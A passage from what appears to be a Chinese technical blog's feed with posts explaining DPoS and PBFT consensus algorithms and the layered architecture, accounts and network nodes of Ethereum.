见证人节点是被普通节点选举出来，代表广大普通节点为区块链添加新区块，执行记帐权利的节点。见证人节点一般会保持中立，维护区块链系统分布式帐本的安全，因为见证人节点始终处于普通节点（利益相关者）的选举控制之下，当见证人节点因不良行为（未记帐或签署无效区块等）时，会造成普通节点的权益损失，因此，普通节点可随时将其选票重新分配给其他见证人节点。</p><p><strong>见证人节点需要具体负责：</strong></p><ol><li><p>确保节点的正常运行；</p></li><li><p>收集区块链网络里的交易信息，验证交易，把交易打包到区块；</p></li><li><p>向所有见证人节点广播新区块，其它见证人节点验证后把区块添加到本地账本数据库中；</p></li><li><p>组织领导并促进区块链项目的发展，对区块链网络发展做出积极的贡献（如贡献代码、筹集资金、建立社群等）来不断提高声誉。</p></li></ol><p><strong>DPoS算法参考流程如下：</strong></p><p>  <strong>(1) 新节点加入系统作为普通节点运行；</strong></p><p>  <strong>(2) 系统各节点投票选出固定数量的见证人节点；</strong></p><p>  <strong>(3) 系统对见证人节点进行排序；</strong></p><p>  <strong>(4) 见证人节点按照排序，根据系统规定的时间间隔（如EOS系统为0.5秒）轮流生成新区块，如果见证人节点没有成功生成区块，则跳过该见证人节点，由下一见证人节点继续生成区块；</strong></p><p>  <strong>(5) 根据见证人节点的排序，新生成的区块交由后续的见证人节点进行区块验证，一个新区块得到超过2&#x2F;3个见证人节点的验证确认后，才能被正式加入到区块链中。</strong></p><p><strong>DPoS算法的局限性</strong></p><p> (1) DPoS算法中选举少数见证人节点代表其它节点生产区块，系统长期运行下去，可能导致少数见证人节点获得的权益激励积累远远多于其它节点，当见证人节点拥有的权益过多时，就拥有了控制见证节点选举的能力，进而破坏选举的民主性。</p><p> (2) DPoS算法中被选举出来的见证人节点可能是恶意节点，当恶意节点不能成功生成区块时，DPoS算法只是选择跳过该节点由下一节点继续生产区块，并且只寄希望于在后续通过投票的方式将其从见证人节点集合中淘汰。缺乏对恶意节点的惩罚措施，该节点仍然可以参与后续的共识过程和见证人节点竞选，继续影响着区块链系统的安全性。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PBFT共识算法</title>
      <link href="/2024/12/16/PBFT%E5%85%B1%E8%AF%86%E7%AE%97%E6%B3%95/"/>
      <url>/2024/12/16/PBFT%E5%85%B1%E8%AF%86%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="PBFT共识算法"><a href="#PBFT共识算法" class="headerlink" title="PBFT共识算法"></a>PBFT共识算法</h1><h2 id="PBFT算法概述"><a href="#PBFT算法概述" class="headerlink" title="PBFT算法概述"></a>PBFT算法概述</h2><h3 id="定义与介绍"><a href="#定义与介绍" class="headerlink" title="定义与介绍"></a>定义与介绍</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>Practical Byzantine Fault Tolerance（PBFT）是一种用于分布式计算和分布式系统中的共识算法，旨在解决拜占庭容错问题。（拜占庭容错问题涉及到在分布式系统中存在故障或恶意节点的情况下，如何确保系统能够维持一致性）。</p><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>PBFT是一种<strong>状态机副本复制算法</strong>，即服务作为状态机进行建模，状态机在分布式系统的不同节点进行副本复制。每个状态机的副本都保存了服务的状态，同时也实现了服务的操作。将所有的副本组成的集合使用大写字母R表示，使用0到|R|-1的整数表示每一个副本。为了描述方便，假设|R|&#x3D;3f+1，这里f是有可能失效的副本的最大个数。尽管可以存在多于3f+1个副本，但是额外的副本除了降低性能之外不能提高可靠性。</p><p><code>PBFT</code>算法中节点只有两种角色，<code>主节点（primary）</code>和<code>副本（replica）</code>，两种角色之间可以相互转换。两者之间的转换又引入了<code>视图（view）</code>的概念，<code>视图</code>在<code>PBFT</code>算法中起到逻辑时钟的作用。</p><p>  </p><h3 id="特点与工作原理"><a href="#特点与工作原理" class="headerlink" title="特点与工作原理"></a>特点与工作原理</h3><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ol><li><strong>拜占庭容错：</strong> PBFT旨在解决拜占庭容错问题，这意味着系统可以继续正常运行，即使有一些节点是恶意的或出现了故障。</li><li><strong>节点投票：</strong> 在PBFT中，网络中的节点会相互交流以达成共识。每个节点会对提出的交易或区块进行投票，表达自己的意见。</li><li><strong>三阶段协议：</strong> PBFT采用了一种三阶段的协议，包括预备（pre-prepare）、准备（prepare）和提交（commit）阶段。在每个阶段，节点都会按照协议的规则发送消息，以便其他节点验证并最终达成共识。</li><li><strong>多数原则：</strong> PBFT要求绝大多数节点达成一致意见，才能够执行交易或添加区块。这有助于防止恶意节点或错误导致的不一致性。</li><li><strong>较高性能：</strong> PBFT通常具有较高的性能，因为节点之间的通信和共识是快速的，不需要执行复杂的计算难题（如PoW）。</li><li><strong>可扩展性：</strong> 尽管PBFT对于确保一致性非常有效，但它的可扩展性在大型网络中可能受到限制。</li></ol><h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p> 其核心工作原理是在存在拜占庭错误的情况下，通过多个节点协作完成共识，保证系统的一致性和可靠性。</p><p><strong>具体：</strong></p><h5 id="1-请求阶段（Request）"><a href="#1-请求阶段（Request）" class="headerlink" title="1. 请求阶段（Request）"></a><strong>1. 请求阶段（Request）</strong></h5><ul><li>客户端（Client）向主节点发送请求，内容包括操作类型和参数。</li><li>请求格式为：<code>&lt;请求ID, 操作, 客户端ID&gt;</code>，通过消息认证机制确保其来源可信。</li></ul><hr><h5 id="2-预准备阶段（Pre-Prepare）"><a href="#2-预准备阶段（Pre-Prepare）" class="headerlink" title="2. 预准备阶段（Pre-Prepare）"></a><strong>2. 预准备阶段（Pre-Prepare）</strong></h5><ul><li>主节点接收到客户端请求后，为该请求分配序列号（Sequence Number）。</li><li>主节点将请求与序列号组成的消息广播给所有备节点，格式为：<br><code>&lt;视图号, 序列号, 请求内容&gt;</code>。</li><li>备节点验证：<ol><li>消息的完整性和合法性。</li><li>主节点是否按照请求的顺序分配序列号。</li></ol></li><li>若验证通过，备节点记录该消息并进入下一阶段。</li></ul><hr><h5 id="3-准备阶段（Prepare）"><a href="#3-准备阶段（Prepare）" class="headerlink" title="3. 准备阶段（Prepare）"></a><strong>3. 准备阶段（Prepare）</strong></h5><ul><li>每个备节点将自己接收到的 <code>Pre-Prepare</code> 消息广播给其他节点，形成 <code>Prepare</code> 消息。</li><li>节点收到至少 2f+1条来自不同节点的 <code>Prepare</code> 消息（包括自身）后，确认该请求在网络中达成了一致性，记录状态并进入下一阶段。</li></ul><hr><h5 id="4-提交阶段（Commit）"><a href="#4-提交阶段（Commit）" class="headerlink" title="4. 提交阶段（Commit）"></a><strong>4. 提交阶段（Commit）</strong></h5><ul><li>每个节点将 <code>Prepare</code> 消息汇总并广播一个 <code>Commit</code> 消息。</li><li>当一个节点收到至少 2f+1条 <code>Commit</code>消息后：<ol><li>确认请求已被网络中大多数节点接受。</li><li>执行操作，并记录操作结果。</li></ol></li></ul><hr><h5 id="5-回复阶段（Reply）"><a href="#5-回复阶段（Reply）" class="headerlink" title="5. 回复阶段（Reply）"></a><strong>5. 回复阶段（Reply）</strong></h5><ul><li>节点将执行结果发送给客户端。</li><li>客户端接收到来自至少 f+1 个不同节点的相同回复后，确认操作成功完成。</li></ul><hr><h2 id="PBFT算法流程"><a href="#PBFT算法流程" class="headerlink" title="PBFT算法流程"></a>PBFT算法流程</h2><p>  在算法开始阶段，<code>主节点</code>由 <code>p = v mod n</code>计算得出，随着<code>v</code>的增长可以看到<code>p</code>不断变化。</p><p>  首先客户端发送消息<code>m</code>给主节点<code>p</code>，主节点就开始了<code>PBFT</code>三阶段协议，其中<code>pre-prepare</code>和<code>prepare</code>阶段最重要的任务是保证同一个<code>主节点</code>发出的请求在同一个<code>视图（view）</code>中的顺序是一致的，<code>prepare</code>和<code>commit</code>阶段最重要的任务是保证请求在不同<code>视图</code>之间的顺序是一致的。</p><ul><li>主节点收到客户端发送来的消息后，构造<code>pre-prepare</code>消息结构体<code>&lt; &lt;PRE-PREPARE, v, n, d&gt;, m &gt;</code>广播到集群中的其它节点。<ol><li><code>PRE-PREPARE</code>标识当前消息所处的协议阶段。</li><li><code>v</code>标识当前视图编号。</li><li><code>n</code>为主节点广播消息的一个唯一递增序号。</li><li><code>d</code>为<code>m</code>的消息摘要。</li><li><code>m</code>为客户端发来的消息。</li></ol></li><li><code>副本(backup)</code>收到主节点请求后，会对消息进行检查，检查通过会存储在本节点。当节点收到<code>2f+1</code>（包括自己）个相同的消息后，会进入<code>PREPARE</code>状态，广播消息<code>&lt; &lt;PREPARA, v, n, d, i&gt; &gt;</code>，其中<code>i</code>是本节点的编号。对消息的有效性有如下检查：<ol><li>检查收到的消息体中摘要<code>d</code>，是否和自己对<code>m</code>生成的摘要一致，确保消息的完整性。</li><li>检查<code>v</code>是否和当前视图<code>v</code>一致。</li><li>检查序号<code>n</code>是否在水线<code>h</code>和<code>H</code>之间，避免快速消耗可用序号。</li><li>检查之前是否接收过相同序号<code>n</code>和<code>v</code>，但是不同摘要<code>d</code>的消息。</li></ol></li><li><code>副本</code>收到<code>2f+1</code>（包括自己）个一致的<code>PREPARE</code>消息后，会进入<code>COMMIT</code>阶段，并且广播消息<code>&lt; COMMIT, v, n, D(m), i &gt;</code>给集群中的其它节点。在收到<code>PREPARE</code>消息后，副本同样也会对消息进行有效性检查，检查的内容是上文<code>1, 2, 3</code>。</li><li><code>副本</code>收到<code>2f+1</code>（包括自己）个一致的<code>COMMIT</code>个消息后执行<code>m</code>中包含的操作，其中，如果有多个<code>m</code>则按照序号<code>n</code>从小到大执行，执行完毕后发送执行成功的消息给客户端。</li></ul><p>算法的流程图：</p><p><img src="https://s2.loli.net/2024/12/16/Uu7bC3d2PieGyQq.webp" alt="1.webp"></p><p><strong>Pbft算法的时间复杂度？</strong><br>A：Pbft算法的时间复杂度O(n^2)，在<code>prepare</code>和<code>commit</code>阶段会将消息广播两次，一般而言，Pbft集群中的节点都不会超过100。</p><h2 id="PBFT-算法的优势与挑战"><a href="#PBFT-算法的优势与挑战" class="headerlink" title="PBFT 算法的优势与挑战"></a>PBFT 算法的优势与挑战</h2><h3 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h3><h4 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h4><p>PBFT是一种可行的共识算法，特别适用于需要高度安全性和快速共识的场景，例如金融领域或联盟区块链。</p><h4 id="较高容错性"><a href="#较高容错性" class="headerlink" title="较高容错性"></a>较高容错性</h4><p>为了更多的容错性，<code>PBFT</code>算法最大的容错节点数量<code>( n - 1 ) / 3</code>，也就是是说4个节点的集群最多只能容忍一个节点作恶或者故障。</p><h4 id="保证集群的可用性-稳定性"><a href="#保证集群的可用性-稳定性" class="headerlink" title="保证集群的可用性&amp;稳定性"></a>保证集群的可用性&amp;稳定性</h4><ul><li>具有<strong>视图切换</strong>（View-Change）机制。</li></ul><p><code>view-change</code>提供了一种当主节点宕机以后依然可以保证集群可用性的机制。<code>view-change</code>通过计时器来进行切换，避免副本长时间的等待请求。<br>当副本收到请求时，就启动一个计时器，如果这个时候刚好有定时器在运行就重置（reset）定时器，但是<code>主节点</code>宕机的时候，副本<code>i</code>就会在当前<code>视图</code>v中超时，这个时候副本<code>i</code>就会触发<code>view-change</code>的操作，将视图切换为<code>v+1</code>。</p><ul><li><p>副本<code>i</code>会停止接收除了<code>checkpoint</code>,<code>view-change</code>和<code>new view-change</code>以外的请求，同时广播消息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;VIEW-CHANGE, v+1, n, C, P, i&gt;</span><br></pre></td></tr></table></figure><p>的消息到集群。</p><ol><li><code>n</code>是节点<code>i</code>知道的最后一个<code>stable checkpoint</code>的消息序号。</li><li><code>C</code>是节点<code>i</code>保存的经过<code>2f+1</code>个节点确认<code>stable checkpoint</code>消息的集合。</li><li><code>P</code>是一个保存了<code>n</code>之后所有已经达到<code>prepared</code>状态消息的集合。</li></ol></li><li><p>当在视图( v+1 )中的主节点<code>p1</code>接收到<code>2f</code>个有效的将视图变更为<code>v+1</code>的消息以后，<code>p1</code>就会广播一条消息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;NEW-VIEW, v+1, V, Q&gt;</span><br></pre></td></tr></table></figure><ol><li><code>V</code>是<code>p1</code>收到的，包括自己发送的<code>view-change</code>的消息集合。</li><li><code>Q</code>是<code>PRE-PREPARE</code>状态的消息集合，但是这个<code>PRE-PREPARE</code>消息是从<code>PREPARE</code>状态的消息转换过来的。</li></ol></li><li><p>从节点接收到<code>NEW-VIEW</code>消息后，校验签名，<code>V</code>和<code>Q</code>中的消息是否合法，验证通过，主节点和副本都 进入视图<code>v+1</code>。</p></li></ul><p>  当<code>p1</code>在接收到<code>2f+1</code>个<code>VIEW-CHANGE</code>消息以后，可以确定<code>stable checkpoint</code>之前的消息在视图切换的过程中不会丢，但是当前检查点之后，下一个检查点之前的已经<code>PREPARE</code>可能会被丢弃，在视图切换到<code>v+1</code>后，<code>Pbft</code>会把旧视图中已经<code>PREPARE</code>的消息变为<code>PRE-PREPARE</code>然后新广播。</p><ul><li>如果集合<code>P</code>为空，广播<code>&lt;PRE-PREPARE, v+1, n, null&gt;</code>，接收节点就什么也不做。</li><li>如果集合<code>P</code>不为空，广播<code>&lt;PRE-PREPARE, v+1, n,d&gt;</code></li></ul><p>  总结一下，在<code>view-change</code>中最为重要的就是<code>C</code>，<code>P</code>，<code>Q</code>三个消息的集合，<code>C</code>确保了视图变更的时候，<code>stable checkpoint</code>之前的状态安全。<code>P</code>确保了视图变更前，已经<code>PREPARE</code>的消息的安全。<code>Q</code>确保了视图变更后<code>P</code>集合中的消息安全。回想一下<code>pre-prepare</code>和<code>prepare</code>阶段最重要的任务是保证，同一个<code>主节点</code>发出的请求在同一个<code>视图（view）</code>中的顺序是一致的，而在视图切换过程中的<code>C</code>，<code>P</code>，<code>Q</code>三个集合就是解决这个问题的。</p><ul><li><strong>视图协商（NegotiateView）机制</strong></li></ul><p>集群在运行过程中，可能出现网络抖动、磁盘故障等原因，会导致部分节点的执行速度落后大多数节点，在<code>Pbft</code>中采用了<code>视图协商（NegotiateView）</code>的机制来保持同步。</p><p>当一个节点多次<code>view-change</code>失败就触发<code>NegotiateView</code>同步集群数据，流程如下：</p><p><img src="https://s2.loli.net/2024/12/16/WIfvRk62ZLqwQsr.webp" alt="2.webp"></p><ul><li>新增节点<code>Replica 4</code>发起<code>NegotiateView</code>消息给其他节点；</li><li>其余节点收到消息以后，返回自己的视图信息，节点ID，节点总数N；</li><li><code>Replica 4</code>收到<code>2f+1</code>个相同的消息后，如果quorum个视图编号和自己不同，则同步view和N；</li><li><code>Replica 4</code>同步完视图后，发送<code>RevoeryToCheckpoint</code>的消息，其中包含自身的<code>checkpoint</code>信息；</li><li>其余节点收到<code>RevoeryToCheckpoint</code>后将自身最新的检查点信息返回给<code>Replica 4</code>;</li><li><code>Replica 4</code>收到quorum个消息后，更新自己的检查点到最新，更新完成以后向正常节点索要pset、qset和cset的信息（即PBFT算法中pre-prepare阶段、prepare阶段和commit阶段的数据）同步至全网最新状态；</li></ul><h4 id="遵循线性一致性（-linearizability-）"><a href="#遵循线性一致性（-linearizability-）" class="headerlink" title="遵循线性一致性（ linearizability ）"></a>遵循线性一致性（ linearizability ）</h4><p>（线性一致性的解释：就是在并发编程里，我们进行了一番操作，得到了一个结果。然后这个操作的运行记录，和按照串行顺序一步步来的运行记录相一致，我们就能称其为「线性一致的（linearizable）」）。</p><h3 id="挑战"><a href="#挑战" class="headerlink" title="挑战"></a>挑战</h3><p>PBFT的实现可能相对复杂，且在大规模网络中可能面临一些挑战。</p><p><code>PBFT</code>算法假设的环境比<code>Raft</code>算法更加的’恶劣‘，<code>Raft</code>算法只支持容错故障节点，而<code>PBFT</code>算法除了需要支持容错故障节点之外，还需要容忍作恶节点（作恶节点节点是指可能对接收到的消息作出截然相反的回复，甚至伪造消息）。</p><h2 id="PBFT算法的实现与优化"><a href="#PBFT算法的实现与优化" class="headerlink" title="PBFT算法的实现与优化"></a>PBFT算法的实现与优化</h2><p>与传统的Proof of Work（PoW）和Proof of Stake（PoS）等共识算法不同，PBFT通常用于<strong>私有或联盟区块链网络</strong>，其中节点的身份已知，且相互信任。其和 <a href="https://learnblockchain.cn/2019/07/18/raft-protocol/">Raft算法</a>解决的核心问题都是在分布式环境下如何保持集群状态的一致性，简而言之就是一组服务，给定一组操作，最后得到一致的结果。</p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p><strong>代码实现：</strong></p><p><a href="https://github.com/CyHsiung/Practical-Byzantine-Fault-Tolerance-PBFT-">https://github.com/CyHsiung/Practical-Byzantine-Fault-Tolerance-PBFT-</a></p><ol><li><strong>联盟链</strong></li></ol><p>PBFT 是联盟链的常用共识算法，因为它对节点的数量和参与身份有一定限制，适合权限网络。</p><ul><li><code>Hyperledger Fabric</code>：PBFT 早期被作为 Hyperledger 的共识候选。</li><li><code>Tendermint</code>：基于 PBFT 的一种区块链共识实现，注重高性能和低延迟。</li></ul><ol start="2"><li><strong>分布式数据库</strong></li></ol><ul><li>在需要高容错性的分布式数据库中，PBFT 可用于确保数据一致性和可用性。</li></ul><ol start="3"><li><strong>金融系统</strong></li></ol><ul><li>金融机构常部署 PBFT 来防范节点作恶，从而在跨机构交易或清算网络中提供高安全性。</li></ul><ol start="4"><li><strong>物联网（IoT）</strong></li></ol><ul><li>在边缘计算场景，PBFT 被用于提高节点协作的一致性，增强系统的鲁棒性。</li></ul><h4 id="优化："><a href="#优化：" class="headerlink" title="优化："></a><strong>优化：</strong></h4><p>原始 PBFT 的消息复杂度为 O(n2))，针对该问题，以下优化措施被提出：</p><ol><li><p><strong>分批处理</strong></p><p>将节点分为共识节点和候选节点。通过优化一致性协议，以减少共识过程中节点的通信量</p></li><li><p><strong>使用消息认证码（MAC）</strong></p><p>在正常运行时，使用 MAC 替代公钥加密进行节点身份验证，显著提高效率。</p></li><li><p><strong>快速路径优化</strong></p><p>在无故障情况下，跳过某些冗余通信步骤，进一步加快请求处理速度。</p></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>PBFT 算法作为分布式共识的基础，推动了区块链和容错技术的发展。随着优化技术的进一步提升，它在金融、物联网和云计算等领域的应用潜力将更加广阔。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>线性一致性解释参考论文：<a href="https://cs.brown.edu/~mph/HerlihyW90/p463-herlihy.pdf">https://cs.brown.edu/~mph/HerlihyW90/p463-herlihy.pdf</a></p><p>全篇参考论文：<a href="http://www.scs.stanford.edu/nyu/03sp/sched/bfs.pdf">www.scs.stanford.edu/nyu/03sp/sched/bfs.pdf</a></p><p>优化参考：优化PBFT算法实现<a href="https://github.com/fangvv/SPBFT">https://github.com/fangvv/SPBFT</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>链原——以太坊系统</title>
      <link href="/2024/12/11/%E9%93%BE%E5%8E%9F%E2%80%94%E2%80%94%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%B3%BB%E7%BB%9F/"/>
      <url>/2024/12/11/%E9%93%BE%E5%8E%9F%E2%80%94%E2%80%94%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="以太坊系统"><a href="#以太坊系统" class="headerlink" title="以太坊系统"></a>以太坊系统</h2><h3 id="以太坊区块链系统架构"><a href="#以太坊区块链系统架构" class="headerlink" title="以太坊区块链系统架构"></a><strong>以太坊区块链系统架构</strong></h3><p><strong>以太坊区块链系统依然是P2P体系结构，即对等网络结构</strong></p><p><strong>以太坊系统每个节点都可以存储完整的区块链与账本数据，每个节点都可以发起和监听以太坊网络上的交易信息，验证每个交易和区块的合法性；</strong></p><p><strong>每个节点都可以交易的形式发布智能合约，智能合约将存储于区块链中，加载到每个节点上的以太坊虚拟机EVM中执行</strong></p><p>虽然每个以太坊系统节点上都安装了对等的以太坊系统软件，但是每个节点可以自由选择启动以太坊系统的不同功能，从而属于不同的节点类型，在区块链网络中扮演不同的角色。目前，以太坊系统的节点总体上可以分为<strong>“全节点”、“轻节点”、“存档节点”</strong>等类型，其中发挥核心作用的是<strong>全节点。</strong></p><p>【1】</p><h4 id="系统逻辑架构"><a href="#系统逻辑架构" class="headerlink" title="系统逻辑架构"></a><strong>系统逻辑架构</strong></h4><p>【2】</p><p>以太坊系统的存储层主要采用文件系统和LevelDB Key-Value数据库，为以太坊系统相关的区块链、分布式账本、智能合约、X.509数字证书、日志、配置文件等数据提供高效、可靠持久化存储服务。</p><p>以太坊系统的数据层是系统核心功能层级之一，对以太坊系统核心的区块、区块链、交易、账本、账户、地址、状态树、交易树、收据树等关键数据结构进行定义和处理，负责将交易打包进区块，由区块组成区块链，并构建了状态树、交易树、收据树等数据结构。同时以太坊系统采用了传统的账户&#x2F;余额模型构建账本数据，更加易于理解，并基于底层的存储服务提供对以太坊区块链数据的安全读写访问管理。</p><p><strong>以太坊系统的网络层是系统核心功能层级之一，主要采用结构化P2P网络</strong>，基于Kademlia分布式哈希表协议，实现网络节点快速发现与连接，以及区块、交易数据的分发与同步，为以太坊系统各网络节点之间提供节点发现与安全连接通信机制，为交易、区块信息在区块链网络所有节点之间提供高效传播与有效性验证机制。</p><p><strong>以太坊系统的共识层</strong>是系统核心功能层级之一，系统前期版本采用与比特币系统类似的PoW工作量证明共识机制，但是对PoW共识算法进行了改进优化，没有采用比特币系统单纯依赖算力的双SHA-256哈希计算，而是使用了同时依赖于算力和内存容量的ETHash算法，系统后期版本计划支持算力无关的PoS权益证明共识机制。</p><p><strong>以太坊系统的激励层</strong>在共识层的功能基础上，采用无总量限制的以太币发行机制，与比特币系统的激励机制不同，除了出块激励外，还增加了叔块激励和交易服务费等激励机制。</p><p><strong>以太坊系统的合约层</strong>首次定义并提供了强大的智能合约功能，智能合约可以基于Solidity等多种图灵完备的编程语言开发实现，并提供了专用的以太坊虚拟机EVM作为智能合约的安全隔离运行环境。</p><p><strong>以太坊系统的接口层</strong>提供了基于JSON RPC、Web3.js的SDK接口和命令行接口。</p><p>   <strong>以太坊系统的应用层</strong>基于接口层提供的SDK接口，可以基于以太坊区块链实现面向多种应用场景和业务逻辑的公有链或DApp去中心化应用。</p><h3 id="以太坊系统数据层"><a href="#以太坊系统数据层" class="headerlink" title="以太坊系统数据层"></a><strong>以太坊系统数据层</strong></h3><h4 id="区块与区块链"><a href="#区块与区块链" class="headerlink" title="区块与区块链"></a><strong>区块与区块链</strong></h4><p><strong>以太坊区块的区块体除了包含交易列表外，还包含一个特殊的叔区块（Uncle Block）头部分。</strong></p><p>【4】</p><p>【3】</p><h4 id="账本数据"><a href="#账本数据" class="headerlink" title="账本数据"></a><strong>账本数据</strong></h4><ul><li><p>以太坊的分布式账本采用了传统记账系统的账户模型，即每个用户对应一个直接记录余额的账户，交易中附带有参与交易的账户的信息。以太坊用账户来记录系统状态，包括每个账户存储余额信息、智能合约代码和内部数据存储等。</p></li><li><p>相比于比特币的UTXO模型，以太坊所采用的传统账户&#x2F;余额模型显然更易于理解和进行智能合约的编程。</p></li><li><p>以太坊的每一个账户都由公钥密码机制生成的一对公私钥进行定义，账户地址是采用一种SHA-3（Keccak-256）哈希算法对公钥数据进行哈希计算的32字节结果的后20字节数据的40位十六进制字符表示。</p><p>【5】</p></li></ul><p><strong>以太坊系统有两类账户：</strong></p><p>  <strong>(1) 外部账户EOA（Externally Owned Account）</strong>**</p><p>​    <strong>外部账户是给以太币拥有者分配的账户，拥有该账户的用户可以通过账户对应的私钥创建和签署交易，发送消息至其他外部账户或合约账户。</strong></p><p>  <strong>(2) 合约账户COA（Contract Account）</strong></p><p>​    <strong>合约账户是一种特殊用途的账户，用于存储执行的智能合约代码，只能被外部账户触发从而执行其对应的合约代码，从而执行各种预先定义好的操作。</strong></p><h4 id="交易数据"><a href="#交易数据" class="headerlink" title="交易数据"></a>交易数据</h4><h4 id="状态数据"><a href="#状态数据" class="headerlink" title="状态数据"></a><strong>状态数据</strong></h4><p>  在以太坊系统中，所有账户（外部账户与合约账户）的状态共同构成了以太坊系统的状态。以太坊系统用一棵采用默克尔帕特里夏MPT树型数据结构定义的“全局状态树”来保存每个区块产生时系统的状态，并在当时的区块中保存了状态树的根哈希。</p><ul><li><p>状态树中的每个叶子节点都表示一个账户状态，当新区块被产生时，状态树的根哈希值将被写入区块中，期间只会有小部分的账户状态会发生改变，状态树中只有部分节点状态会改变。</p></li><li><p>为了节省存储空间，并不是每个区块都独立构建一棵状态树，而是共享状态树的节点数据，针对发生改变的节点状态，会新建一些分支，而不是更新原节点的状态数据，历史状态数据都将被保留。</p></li></ul><h3 id="以太坊系统网络层"><a href="#以太坊系统网络层" class="headerlink" title="以太坊系统网络层"></a><strong>以太坊系统网络层</strong></h3><h4 id="P2P网络结构与节点"><a href="#P2P网络结构与节点" class="headerlink" title="P2P网络结构与节点"></a><strong>P2P网络结构与节点</strong></h4><p>以太坊系统网络层位于数据层之上、共识层之下，是系统的核心功能层次之一，主要提供以下网络管理功能：</p><p>  (1) 区块链P2P网络的组网管理</p><p>  (2) 各网络节点的节点发现、连接与通信管理</p><p>  (3) 新区块或交易数据广播管理</p><p>  (4) 各网络节点之间区块链数据同步管理</p><p><strong>(1)全节点</strong></p><p>​    <strong>以太坊系统的网络全节点需要保存全链数据，全节点所需的储存空间也在不断增长。</strong></p><p>​    <strong>以太坊系统网络全节点的主要工作包括：</strong></p><p>​    • 将系统所有区块链与状态数据存储在节点本地，建立全链数据副本，可以根据请求为网络提供任何公开数据。</p><p>​    • 接收并验证新区块数据，若新区块通过验证，就保存在本地的区块链中，并向其它邻近节点广播区块数据。</p><p>​    • 接收并验证其他帐户或去中心化应用DApp发出的交易数据，若新交易通过验证，就保存在本地的交易池中，并向其它邻近节点广播交易数据。</p><p>   • 通过求解指定的PoW工作量证明计算难题来竞争新区块的出块权，从而获得以太币激励，并把多条交易记录打包写入新区块。</p><p>   • 对存储在区块链中的智能合约进行部署与执行。</p><p><strong>（2) 轻节点</strong></p><p>​    以太坊系统网络轻节点不需储存和维护完整的区块链数据副本，只存储所有的区块头数据，可以通过检验区块头中包含的状态树根哈希，并按需向全节点请求相关区块链信息，从而验证数据的有效性。轻节点一般用于发送或传递交易信息，对节点的CPU计算性能、内存容量、磁盘容量、运行稳定性都要求较低。</p><p><strong>(3) 存档节点</strong></p><p>​    存档节点存储了所有全节点保存的内容，同时创建了历史状态的档案，存档节点不参与竞争出块权的共识计算，一般只提供状态查询服务，例如，如果要查询一个账户在以太坊区块高度1000000时的以太币余额，就要查询一个存档节点。</p><h4 id="节点发现管理"><a href="#节点发现管理" class="headerlink" title="节点发现管理"></a><strong>节点发现管理</strong></h4><h4 id="节点连接管理"><a href="#节点连接管理" class="headerlink" title="节点连接管理"></a><strong>节点连接管理</strong></h4><p>​    <strong>以太坊网络的节点连接涉及到Peer（对等节点）、Session（会话）、Capability（能力）等基本概念。</strong></p><p>  (1) Peer：在以太坊系统的P2P网络中，Peer与节点（Node）是不同层次的对象，节点更底层，在NodeTable中进行管理，Peer是建立TCP连接会话的对象。</p><p>  (2) Session：在以太坊系统的P2P网络中，Session是节点连接管理中最重要的结构，Session表示Peer之间真正建立了连接后的逻辑关系。</p><p>  (3) Capability：指节点能支持的功能，表示以太坊系统在P2P网络通信层之上的业务能力，P2P网络只提供节点之间的连接通道，具体要传输什么数据，由节点支持的Capability决定，此外，由于以太坊系统经过多次升级，不同节点上安装运行的以太坊系统版本可能不同，为了实现系统向后兼容，节点连接时需要确定都可以支持的Capability集合。</p><h4 id="交易广播"><a href="#交易广播" class="headerlink" title="交易广播"></a><strong>交易广播</strong></h4><p>在以太坊系统的P2P网络中，交易的广播过程如下：</p><p>  (1) 每个节点会针对每个邻近节点维护一个待发送交易列表TxsA和已知交易列表TxsB；</p><p>  (2) 当节点接收到一个新交易Tx时，会先查询哪些邻近节点没有该交易信息，并将交易Tx加入邻近节点对应的待发送交易列表TxsA中；</p><p>  (3) 节点向每个待发送交易列表TxsA不为空的节点异步发送交易；</p><p>  (4) 交易发送成功后，会将被发出的交易加入对应邻近节点的已知交易列表TxsB。</p><h4 id="交易池"><a href="#交易池" class="headerlink" title="交易池"></a><strong>交易池</strong></h4><p><strong>以太坊系统也有交易池机制，交易池中的交易信息来源主要包括：</strong></p><p>  <strong>(1)本地提交：通过第三方应用调用以太坊网络节点本地的RPC服务提交的交易。</strong></p><p>  <strong>(2)广播同步：通过交易广播与同步，将其它节点的交易数据同步到该节点交易池。</strong></p><p>注意：当节点在竞争计算出块权时，会从交易池中获取并验证数条交易信息打包到区块中，如果节点成功获得出块权，新区块会被广播，此时新区块中包含的交易信息不会马上从交易池中删除，直到新区块被以太坊系统区块链确认，新区块中包含的交易才会从交易池中删除。如果以太坊系统的区块链发生了分叉，写进分叉的区块中包含的交易也不会从交易池中删除，而是继续在交易池中等待重新打包。</p><h4 id="区块广播与同步"><a href="#区块广播与同步" class="headerlink" title="区块广播与同步"></a><strong>区块广播与同步</strong></h4><p>(1) 节点A假如连接了n个节点，从相邻节点中选出sqrt(n)个节点广播包含完整区块信息的消息，向剩余的sqrt(n)个节点只广播区块哈希的消息；</p><p>(2) 收到到节点A广播的完整区块信息的节点，会将收到的区块加入等待验证的区块队列；</p><p>(3) 